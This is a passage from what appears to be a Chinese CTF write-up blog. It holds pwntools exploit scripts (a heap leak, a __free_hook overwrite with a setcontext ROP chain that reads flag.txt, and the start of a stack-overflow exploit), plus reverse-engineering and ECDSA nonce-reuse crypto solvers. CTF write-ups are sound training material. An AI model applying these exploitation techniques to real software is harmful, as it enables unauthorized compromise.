class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>cli_script() <span class="hljs-comment"># 使用脚本模式必须显式调用这个函数</span><br><br><span class="hljs-comment"># 你能够从gift里面取到很多东西</span><br>io   = gift[<span class="hljs-string">&#x27;io&#x27;</span>] <span class="hljs-comment"># process或remote对象</span><br>elf  = gift[<span class="hljs-string">&quot;elf&quot;</span>] <span class="hljs-comment"># ELF对象，ELF(&quot;./pwn&quot;)</span><br>libc = gift.libc <span class="hljs-comment"># ELF对象， ELF(&quot;./libc.so.6&quot;)</span><br>filename  = gift.filename <span class="hljs-comment"># current filename</span><br>is_debug  = gift.debug <span class="hljs-comment"># is debug or not </span><br>is_remote = gift.remote <span class="hljs-comment"># is remote or not</span><br>gdb_pid   = gift.gdb_pid <span class="hljs-comment"># gdb pid if debug</span><br><br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>gift[<span class="hljs-string">&#x27;libc&#x27;</span>] = libc<br><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br><span class="hljs-keyword">if</span> gift.remote:<br>    libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>    gift[<span class="hljs-string">&#x27;libc&#x27;</span>] = libc<br>    <span class="hljs-comment"># 有时候远程提供的libc与本地不一样，打靶机时替换libc为远程libc</span><br>    <span class="hljs-keyword">pass</span><br>libc_box = LibcBox() <span class="hljs-comment"># LibcBox对象</span><br><br>r_l = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>r_l.srand(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>key = <span class="hljs-string">&#x27;s4cur1ty_p4ssw0rd&#x27;</span><br>key_len = <span class="hljs-built_in">len</span>(key)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">key,ptr</span>):<br>    size = <span class="hljs-built_in">len</span>(ptr)<br>    data = <span class="hljs-built_in">list</span>(ptr)<br>    v5 = <span class="hljs-number">0</span><br>    v6 = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,size):<br>        v5 = (v5+<span class="hljs-number">1</span>)%<span class="hljs-number">256</span><br>        v6 = (v6+key[v5])%<span class="hljs-number">256</span><br>        v4 = key[v5]<br>        key[v5] = key[v6]<br>        key[v6] = v4<br>        data[i] = (data[i]^key[(key[v5]+key[v6])%<span class="hljs-number">256</span>])<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&quot;5. Exit&quot;</span>,<span class="hljs-built_in">str</span>(c))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size,data=<span class="hljs-string">b&#x27;A&#x27;</span></span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&quot;Input the key: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&quot;Input the value size: &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&quot;Input the value: &quot;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    cmd(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&quot;Input the key: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&quot;Input the key: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,data</span>):<br>    cmd(<span class="hljs-number">4</span>)<br>    sla(<span class="hljs-string">&quot;Input the key: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&quot;Input the value: &quot;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getkey</span>():<br>    key_ = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>)]<br>    v8 = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>)]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<br>        key_[i] = i<br>        v8[i] = <span class="hljs-built_in">ord</span>(key[i%key_len])<br>    v7 = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<br>        v7 = (v8[i]+v7+key_[i])%<span class="hljs-number">256</span><br>        v4 = key_[i]<br>        key_[i] = key_[v7]<br>        key_[v7] = v4<br>    <span class="hljs-keyword">return</span> key_<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn_exp</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;PWN&quot;</span>)<br><br>    sla(<span class="hljs-string">&quot;Input your username:&quot;</span>,<span class="hljs-string">&#x27;4dm1n&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;Input your password:&quot;</span>,<span class="hljs-string">&#x27;985da4f8cb37zkj&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>        add(i,<span class="hljs-number">0x2f0</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        free(i)<br>    free(<span class="hljs-number">7</span>)<br>    show(<span class="hljs-number">6</span>)<br>    ru(<span class="hljs-string">&quot;value] = [6,&quot;</span>)<br>    res6 = io.recv(<span class="hljs-number">0x20</span>)<br>    show(<span class="hljs-number">7</span>)<br>    ru(<span class="hljs-string">&quot;value] = [7,&quot;</span>)<br>    res7 = io.recv(<span class="hljs-number">0x20</span>)<br>    key_ = getkey()<br>    res6 = encode(key_,res6)<br>    key_ = getkey()<br>    res7 = encode(key_,res7)<br>    leak = u64_ex(res6[:<span class="hljs-number">8</span>])<br>    heap_base = leak - <span class="hljs-number">0x650671ceec70</span> + <span class="hljs-number">0x650671ced000</span>-<span class="hljs-number">0x900</span><br>    leak = u64_ex(res7[:<span class="hljs-number">8</span>])<br>    libc.address = leak - <span class="hljs-number">0x799da79ebca0</span>+<span class="hljs-number">0x799da7600000</span><br>    <br>    p1 = p64_ex(libc.sym.__free_hook)*<span class="hljs-number">2</span><br>    key_ = getkey()<br>    p1 = encode(key_,p1)<br>    edit(<span class="hljs-number">6</span>,p1)<br>    pay =<span class="hljs-string">b&#x27;&#x27;</span><br>    pay = pay.ljust(<span class="hljs-number">0x78</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64_ex(heap_base+<span class="hljs-number">0x5788be2cf870</span>-<span class="hljs-number">0x5788be2cd000</span>+<span class="hljs-number">0x00</span>)<br>    pay = pay.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64_ex(heap_base+<span class="hljs-number">0x5788be2cf870</span>-<span class="hljs-number">0x5788be2cd000</span>+<span class="hljs-number">0x100</span>)<br>    pay = pay.ljust(<span class="hljs-number">0xa8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64_ex(CG.ret())<br>    pay = pay.ljust(<span class="hljs-number">0xb0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+<span class="hljs-string">b&#x27;flag.txt&#x27;</span><br>    pay = pay.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    pay += p64_ex(CG.ret())*<span class="hljs-number">2</span><br>    pay += p64_ex(CG.pop_rdi_ret())+p64_ex(heap_base+<span class="hljs-number">0x5788be2cf870</span>-<span class="hljs-number">0x5788be2cd000</span>+<span class="hljs-number">0xb0</span>)+p64_ex(CG.pop_rsi_ret())+p64_ex(<span class="hljs-number">0</span>)+p64_ex(CG.pop_rdx_ret())+p64_ex(<span class="hljs-number">0</span>)+p64_ex(libc.sym.<span class="hljs-built_in">open</span>)<br>    pay += p64_ex(CG.pop_rdi_ret())+p64_ex(<span class="hljs-number">3</span>) +p64_ex(CG.pop_rsi_ret())+p64_ex(heap_base+<span class="hljs-number">0x300</span>)+p64_ex(CG.pop_rdx_ret())+p64_ex(<span class="hljs-number">0x100</span>)+p64_ex(libc.sym.read)<br>    pay += p64_ex(CG.pop_rdi_ret())+p64_ex(heap_base+<span class="hljs-number">0x300</span>)+p64_ex(libc.sym.puts)<br>    add(<span class="hljs-number">10</span>,<span class="hljs-number">0x2f0</span>,pay)<br>    CG.set_find_area(find_in_elf=<span class="hljs-literal">False</span>,find_in_libc=<span class="hljs-literal">True</span>)<br>    p = p64_ex(libc.sym.setcontext+<span class="hljs-number">53</span>)*<span class="hljs-number">2</span><br>    key_ = getkey()<br>    p = encode(key_,p)<br>    add(<span class="hljs-number">11</span>,<span class="hljs-number">0x2f0</span>,p)<br>    log.success(<span class="hljs-string">&#x27;setcontext:&#x27;</span>+<span class="hljs-built_in">hex</span>(libc.sym.setcontext+<span class="hljs-number">53</span>))<br>    pause()<br>    free(<span class="hljs-number">10</span>)<br><br><span class="hljs-comment">#log</span><br>    <br>    log.info(<span class="hljs-string">&#x27;#---#---#---#---#&#x27;</span>)<br>    log.success(<span class="hljs-string">&#x27;libc.address:&#x27;</span>+<span class="hljs-built_in">hex</span>(libc.address))<br>    log.success(<span class="hljs-string">&#x27;elf.address:&#x27;</span>+<span class="hljs-built_in">hex</span>(elf.address))<br>    log.success(<span class="hljs-string">&#x27;heap_bae:&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pwn_exp()<br>    io.interactive()<br></code></pre></td></tr></table></figure><h2 id="RE2"><a href="#RE2" class="headerlink" title="RE2"></a>RE2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> base64<br><br>flag = <span class="hljs-string">&#x27;wdflag&#123;&#x27;</span><br><br><span class="hljs-comment"># 第一部分：前8个字符解密</span><br>s2 = [<span class="hljs-number">112</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">108</span>, <span class="hljs-number">0xca</span>, <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;n&#x27;</span>), <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;p&#x27;</span>), <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;p&#x27;</span>), <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;l&#x27;</span>)]<br>first_8 = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s2:<br>    first_8 += <span class="hljs-built_in">chr</span>(i//<span class="hljs-number">2</span>)<br>flag += first_8<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第一部分:&quot;</span>, first_8)<br><br><span class="hljs-comment"># 第二部分：XorrLord异或解密</span><br>v22 = <span class="hljs-string">&#x27;XorrLord&#x27;</span><br>v11 = [<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;9&#x27;</span>), <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;[&#x27;</span>), <span class="hljs-number">23</span>, <span class="hljs-number">16</span>, <span class="hljs-number">127</span>, <span class="hljs-number">13</span>, <span class="hljs-number">71</span>, <span class="hljs-number">6</span>]<br>second_8 = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    second_8 += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(v22[i]) ^ v11[i])<br>flag += second_8<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第二部分:&quot;</span>, second_8)<br><br><span class="hljs-comment"># 第三部分：base64换表解密</span><br><span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;PVLlQVPhPFW&#x27;</span><br>s_str = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br>c_str = <span class="hljs-string">&#x27;CDEFGHIJKLMNOPQRSTUVWXYZABabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><br>code_table = <span class="hljs-built_in">str</span>.maketrans(c_str, s_str)<br>ss = <span class="hljs-built_in">str</span>.translate(code_table)<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(ss) % <span class="hljs-number">4</span> != <span class="hljs-number">0</span>:<br>    ss += <span class="hljs-string">&#x27;=&#x27;</span><br>decoded = base64.b64decode(ss)<br>flag += decoded.decode()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第三部分:&quot;</span>, decoded.decode())<br><br><span class="hljs-comment"># 第四部分：AES解密</span><br>key = <span class="hljs-string">b&quot;AesMasterAesMast&quot;</span><br>ciphertext = <span class="hljs-built_in">bytes</span>([<br>    <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xDE</span>,<br>    <span class="hljs-number">0x78</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xC5</span><br>])<br><br>cipher = AES.new(key, AES.MODE_ECB)<br>plaintext = cipher.decrypt(ciphertext)<br><span class="hljs-comment"># 前8位转换为字符</span><br>aes_result = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> plaintext[:<span class="hljs-number">8</span>])<br>flag += aes_result<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;AES解密(前8位转chr):&quot;</span>, aes_result)<br><br><span class="hljs-comment"># 添加结尾的大括号</span><br>flag += <span class="hljs-string">&#x27;&#125;&#x27;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n最终flag:&quot;</span>, flag)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag长度:&quot;</span>, <span class="hljs-built_in">len</span>(flag))<br></code></pre></td></tr></table></figure><h2 id="CRYPTO02"><a href="#CRYPTO02" class="headerlink" title="CRYPTO02"></a>CRYPTO02</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recover_private_key</span>(<span class="hljs-params">r, s1, s2, z1, z2, n</span>):<br>    k = ((z1 - z2) * gmpy2.invert(s1 - s2, n)) % n<br>    dA = ((s1 * k - z1) * gmpy2.invert(r, n)) % n<br>    <span class="hljs-keyword">return</span> dA<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">victory_decrypt</span>(<span class="hljs-params">ciphertext, key</span>):<br>    key = key.lower()  <span class="hljs-comment"># 转换为小写</span><br>    key_length = <span class="hljs-built_in">len</span>(key)<br>    plaintext = <span class="hljs-string">&#x27;&#x27;</span><br>    ciphertext = ciphertext.lower()  <span class="hljs-comment"># 转换为小写</span><br>    <br>    <span class="hljs-keyword">for</span> i, char <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(ciphertext):<br>        <span class="hljs-keyword">if</span> char.isalpha():<br>            shift = <span class="hljs-built_in">ord</span>(key[i % key_length]) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)<br>            decrypted_char = <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(char) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) - shift) % <span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>))<br>            plaintext += decrypted_char<br>        <span class="hljs-keyword">else</span>:<br>            plaintext += char<br>            <br>    <span class="hljs-keyword">return</span> plaintext<br><br><span class="hljs-comment"># 恢复私钥</span><br>r = <span class="hljs-number">111817653331957669294460466848850458804857945556928458406600106150268654577388</span><br>s1 = <span class="hljs-number">86614391420642776223990568523561232627667766343605236785504627521619587526774</span><br>s2 = <span class="hljs-number">99777373725561160499828739472284705447694429465579067222876023876942075279416</span><br>z1 = <span class="hljs-number">96525870193778873849147733081234547336150390817999790407096946391065286856874</span><br>z2 = <span class="hljs-number">80138688082399628724400273131729065525373481983222188646486307533062536927379</span><br>n = <span class="hljs-number">0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141</span><br><br>dA = recover_private_key(r, s1, s2, z1, z2, n)<br><br><span class="hljs-comment"># 解密AES</span><br>key = sha256(long_to_bytes(dA)).digest()<br>encrypted_data = binascii.unhexlify(<span class="hljs-string">&#x27;6c201c3c4e8b0a2cdd0eca11e7101d45d7b33147d27ad1b9d57e3d1e20c7b3c2e36b8da3142dfd5abe335a604ce7018878b9f157099211a7bbda56ef5285ec0b&#x27;</span>)<br>iv = encrypted_data[:<span class="hljs-number">16</span>]<br>ciphertext = encrypted_data[<span class="hljs-number">16</span>:]<br><br>cipher = AES.new(key, AES.MODE_CBC, iv)<br>decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size)<br><br><span class="hljs-comment"># 解密维吉尼亚密码</span><br>victory_key = <span class="hljs-string">&quot;wangdingcup&quot;</span>  <span class="hljs-comment"># 使用小写密钥</span><br>flag = victory_decrypt(decrypted.decode(), victory_key)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag:&quot;</span>, flag)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>re</tag>
      
      <tag>crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>强网拟态2024</title>
    <link href="/2024/10/20/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024/"/>
    <url>/2024/10/20/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024/</url>
    
    <content type="html"><![CDATA[<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><ul><li><input checked="" disabled="" type="checkbox"> signin</li><li><input checked="" disabled="" type="checkbox"> signin_revenge</li><li><input checked="" disabled="" type="checkbox"> ezcode</li><li><input checked="" disabled="" type="checkbox"> guest book</li><li><input disabled="" type="checkbox"> QWEN (复现)</li><li><input disabled="" type="checkbox"> ker (复现)</li></ul><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>在add功能中存在栈溢出, 打栈溢出就好了<br>对随机数由于是srand(0),进行模拟就好</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*-coding:utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>io_ch=<span class="hljs-number">1</span><br>de_bug=<span class="hljs-number">0</span><br>url=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span><span class="hljs-comment">#&#x27;210.44.150.15&#x27;</span><br>port=<span class="hljs-number">9999</span><span class="hljs-comment">#35942</span><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>filename=<span class="hljs-string">&#x27;./pwn&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><span class="hljs-keyword">if</span> io_ch==<span class="hljs-number">1</span>:<br>    <span class="hljs-comment">#io=remote(url,port)</span><br>    io = remote(<span class="hljs-string">&quot;pwn-66c60f581f.challenge.xctf.org.cn&quot;</span>, <span class="hljs-number">9999</span>, ssl=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-comment">#io=process([&quot;qemu-aarch64-static&quot;,&quot;-g&quot;,&quot;1234&quot;,&quot;./pwn&quot;])</span><br>    <span class="hljs-keyword">pass</span><br>    io=process(filename)<br>    <span class="hljs-keyword">if</span> de_bug==<span class="hljs-number">1</span>:<br>        gdb.attach(io)<br><span class="hljs-keyword">if</span> filename!=<span class="hljs-string">&#x27;&#x27;</span>:<br>    elf=ELF(filename)<br>    libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>s   = <span class="hljs-keyword">lambda</span> content : io.send(content)<br>sl  = <span class="hljs-keyword">lambda</span> content : io.sendline(content)<br>sa  = <span class="hljs-keyword">lambda</span> content,send : io.sendafter(content, send)<br>sla = <span class="hljs-keyword">lambda</span> content,send : io.sendlineafter(content, send)<br>rc  = <span class="hljs-keyword">lambda</span> number : io.recv(number)<br>ru  = <span class="hljs-keyword">lambda</span> content : io.recvuntil(content)<br>rcg = <span class="hljs-keyword">lambda</span> : u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>r_l = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>r_l.srand(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>pop_rdi = <span class="hljs-number">0x0000000000401893</span><br>pop_rsi = <span class="hljs-number">0x2601f</span><br>pop_rdx = <span class="hljs-number">0x142c92</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">c</span>):<br>    sa(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,p32(c))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,data=<span class="hljs-string">b&#x27;A&#x27;</span>,ptr=<span class="hljs-string">b&#x27;A&#x27;</span></span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    sa(<span class="hljs-string">&quot;Index: &quot;</span>,p32(idx))<br>    sa(<span class="hljs-string">&quot;Note: &quot;</span>,data)<br>    sleep(<span class="hljs-number">0.1</span>)<br>    sl(ptr)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    cmd(<span 